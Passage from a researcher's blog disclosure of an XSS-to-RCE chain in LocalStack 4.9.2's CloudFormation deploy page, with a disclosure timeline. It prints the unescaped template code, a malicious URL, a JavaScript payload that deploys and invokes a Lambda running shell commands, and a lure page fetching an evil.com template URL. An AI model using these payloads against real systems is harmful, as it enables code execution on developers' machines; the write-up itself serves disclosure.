+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>  <span style="color:#f92672">from</span> rolo <span style="color:#f92672">import</span> Response
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>  <span style="color:#f92672">from</span> localstack <span style="color:#f92672">import</span> constants
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>  <span style="color:#f92672">from</span> localstack.utils.files <span style="color:#f92672">import</span> load_file
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span>  <span style="color:#f92672">from</span> localstack.utils.json <span style="color:#f92672">import</span> parse_json_or_yaml
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span>  LOG <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(__name__)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CloudFormationUi</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span>      <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">on_get</span>(self, request):
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span>          <span style="color:#f92672">from</span> localstack.utils.aws.aws_stack <span style="color:#f92672">import</span> get_valid_regions
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">18</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">19</span>          deploy_html_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">20</span>              constants<span style="color:#f92672">.</span>MODULE_MAIN_PATH, <span style="color:#e6db74">&#34;services&#34;</span>, <span style="color:#e6db74">&#34;cloudformation&#34;</span>, <span style="color:#e6db74">&#34;deploy.html&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span>          )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span>          deploy_html <span style="color:#f92672">=</span> load_file(deploy_html_file)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">23</span>          req_params <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>values
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">24</span>          params <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span>              <span style="color:#e6db74">&#34;stackName&#34;</span>: <span style="color:#e6db74">&#34;stack1&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">26</span>              <span style="color:#e6db74">&#34;templateBody&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">27</span>              <span style="color:#e6db74">&#34;errorMessage&#34;</span>: <span style="color:#e6db74">&#34;&#39;&#39;&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">28</span>              <span style="color:#e6db74">&#34;regions&#34;</span>: json<span style="color:#f92672">.</span>dumps(sorted(get_valid_regions())),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">29</span>          }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span>          download_url <span style="color:#f92672">=</span> req_params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;templateURL&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span>          <span style="color:#66d9ef">if</span> download_url:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span>              <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span>                  LOG<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Attempting to download CloudFormation template URL: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>, download_url)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">35</span>                  template_body <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(download_url)<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span>                  template_body <span style="color:#f92672">=</span> parse_json_or_yaml(template_body)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">37</span>                  params[<span style="color:#e6db74">&#34;templateBody&#34;</span>] <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(template_body)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">38</span>              <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">39</span>                  msg <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Unable to download CloudFormation template URL: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40</span>                  LOG<span style="color:#f92672">.</span>info(msg)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41</span>                  params[<span style="color:#e6db74">&#34;errorMessage&#34;</span>] <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(msg<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34; - &#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">43</span>          <span style="color:#75715e"># using simple string replacement here, for simplicity (could be replaced with, e.g., jinja)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">44</span>          <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> params<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">45</span>              deploy_html <span style="color:#f92672">=</span> deploy_html<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;&#34;</span>, value)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">46</span>  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span>          <span style="color:#66d9ef">return</span> Response(deploy_html, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span>)
+</span></span></code></pre></div><h1 id="exploitation-chain">Exploitation Chain</h1>
+<p><strong>Malicious URL:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost:4566/_localstack/cloudformation/deploy?templateURL<span style="color:#f92672">=</span>&lt;/script&gt;&lt;script&gt;<span style="color:#f92672">[</span>PAYLOAD<span style="color:#f92672">]</span>&lt;/script&gt;
+</span></span></code></pre></div><p><strong>JavaScript Payload</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">+</span> Date.<span style="color:#a6e22e">now</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;IDCmd&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Configure AWS SDK to point to LocalStack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">AWS</span>.<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">update</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">endpoint</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">accessKeyId</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;test&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">secretAccessKey</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;test&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">region</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;us-east-1&#39;</span>
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Create a CloudFormation stack with a malicious Lambda function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AWS</span>.<span style="color:#a6e22e">CloudFormation</span>().<span style="color:#a6e22e">createStack</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">StackName</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">s</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TemplateBody</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;AWSTemplateFormatVersion&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;2010-09-09&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Resources&#34;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;AWS::Lambda::Function&#34;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Properties&#34;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Runtime&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;nodejs20.x&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;FunctionName&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">f</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Role&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;arn:aws:iam::000000000000:role/r&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Handler&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;index.handler&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Code&#34;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;ZipFile&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`exports.handler = async () =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                const e = require(&#39;child_process&#39;).execSync;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                return e(&#39;id&#39;).toString()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              }`</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>  }).<span style="color:#a6e22e">promise</span>().<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">r</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Wait for stack creation, then invoke the Lambda
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AWS</span>.<span style="color:#a6e22e">Lambda</span>().<span style="color:#a6e22e">invoke</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">FunctionName</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">f</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Payload</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;{}&#39;</span>
+</span></span><span style="display:flex;"><span>      }).<span style="color:#a6e22e">promise</span>().<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">d</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;ID OUTPUT\n\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">Payload</span>)
+</span></span><span style="display:flex;"><span>      })
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">3000</span>)
+</span></span><span style="display:flex;"><span>  })
+</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">2000</span>)
+</span></span></code></pre></div><p><strong>Lambda Function Code Injection</strong></p>
+<p>The payload creates a Lambda function with malicious code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">handler</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">execSync</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">e</span>(<span style="color:#e6db74">&#39;id&#39;</span>).<span style="color:#a6e22e">toString</span>() 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="technical-analysis">Technical Analysis</h2>
+<p>User input is inserted into HTML via string replacement without escaping. LocalStack runs on <code>localhost:4566</code>, accessible from browser JavaScript. LocalStack allows cross-origin requests for development convenience. LocalStack accepts dummy credentials (<code>test/test</code>) by default. Lambda functions execute as actual Node.js/Python processes on the host. The deploy UI loads AWS SDK, making it available to injected scripts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/aws-sdk/2.1015.0/aws-sdk.js&#34;</span>&gt;&lt;/script&gt;
+</span></span></code></pre></div><h3 id="attack-flow-diagram">Attack Flow Diagram</h3>
+<pre tabindex="0"><code>┌─────────────────────────────────────────────────────────────────┐
+│ 1. Attacker sends malicious URL to victim                      │
+│    http://localhost:4566/_localstack/cloudformation/deploy?... │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 2. Victim clicks link, browser loads page from LocalStack      │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 3. deploy_ui.py injects malicious script without HTML escaping │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 4. JavaScript executes in victim&#39;s browser                     │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 5. Script uses AWS SDK to call LocalStack API                  │
+│    - Creates CloudFormation stack with malicious Lambda        │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 6. LocalStack deploys Lambda function on host machine          │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 7. Script invokes Lambda function                              │
+└────────────────────┬────────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────────┐
+│ 8. Lambda executes system commands (RCE)              │
+└─────────────────────────────────────────────────────────────────┘
+</code></pre><p>🔥🔥🔥🔥🔥🔥🔥</p>
+<video class="video" 
+        width="640" 
+        height="360"
+        preload="auto" 
+        controls>
+     <source src="/videos/rce_id.webm" type="video/webm">
+     There should have been a video here but your browser does not seem
+     to support it.
+ </video>
+ 
+
+<h1 id="impact">Impact?</h1>
+<p>Think about hosting a page like the below on a domain whatever.com, then post it around social media&hellip; No CSRF protection, exploit would work at default and execute automatically! Target? Developers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">title</span>&gt;Totally Legit&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>       window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://localhost:4566/_localstack/cloudformation/deploy?templateURL=evil.com/exploit&#39;</span>)
+</span></span><span style="display:flex;"><span>               .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Request sent&#39;</span>))
+</span></span><span style="display:flex;"><span>               .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>));
+</span></span><span style="display:flex;"><span>       };
+</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">h1</span>&gt;Loading...&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h1 id="disclosure-timeline-and-thoughts">Disclosure Timeline and Thoughts</h1>
+<p>I reported this vulnerability promptly on October 17th, 2025, followed by a detailed escalation chain (XSS → CloudFormation → Lambda → RCE) on October 20th, 2025. The vulnerable feature was silently removed via <a href="https://github.com/localstack/localstack/pull/13293/">PR #13293</a> on October 24th, 2025.
+While I appreciate that the vulnerability was addressed quickly, I was disappointed by the lack of communication throughout the process. No acknowledgment was received for either report, and the fix was deployed without notifying me or issuing a public security advisory.
+Looking at the PR itself, you can see the vulnerable code was simply removed—no mention of the security implications, no CVE assignment, and no notification to users that they should update immediately due to a critical RCE vulnerability.
+From a researcher&rsquo;s perspective, this represents a missed opportunity for collaboration. More importantly, from a user security perspective, LocalStack&rsquo;s developer community deserved transparency about this critical vulnerability that could have enabled remote code execution on their machines.
+Security researchers invest significant time identifying and responsibly disclosing vulnerabilities. A simple acknowledgment and coordination on disclosure timing would go a long way in encouraging continued security research that benefits the entire community.
+That said, the research itself was fascinating, and I hope this writeup helps other developers understand the risks of running development tools that expose localhost services.</p>
+<h1 id="affected-version">Affected Version</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>localstack-core<span style="color:#f92672">==</span>4.9.2
+</span></span></code></pre></div>
+
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://cyberroute.github.io/post/2025-10-14-cors/" data-toggle="tooltip" data-placement="top" title="Exploiting CORS vulnerability with basic origin reflection">&larr; Previous Post</a>
+            </li>
+          
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">
+            <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "https-cyberroute-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+		
+		  <a href="mailto:cyberroute@proton.me" title="Email me">
+		
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+		
+		  <a href="https://github.com/CyberRoute" title="GitHub">
+		
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+		
+		  <a href="https://linkedin.com/in/alessandro-bresciani-35763610" title="LinkedIn">
+		
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              Alessandro Bresciani
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2025
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://cyberroute.github.io/">Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.123.7</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://cyberroute.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://cyberroute.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
